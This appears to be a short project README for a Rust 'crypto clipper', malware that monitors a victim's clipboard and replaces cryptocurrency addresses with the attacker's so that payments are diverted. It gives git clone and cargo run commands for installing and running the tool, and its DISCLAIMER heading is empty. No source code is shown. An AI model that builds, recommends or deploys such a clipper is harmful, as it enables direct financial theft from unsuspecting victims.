# Crypto clipper

This application is a simple example of malware that constantly checks the victim's clipboard for cryptocurrency addresses and replaces them with the attacker's address. This causes the victim to accidentally send the attacker money they meant to send to a third party.

## How to install

```
git clone https://github.com/f1nzo/crypto-clipper
cd crypto-clipper
cargo run
```

## DISCLAIMER
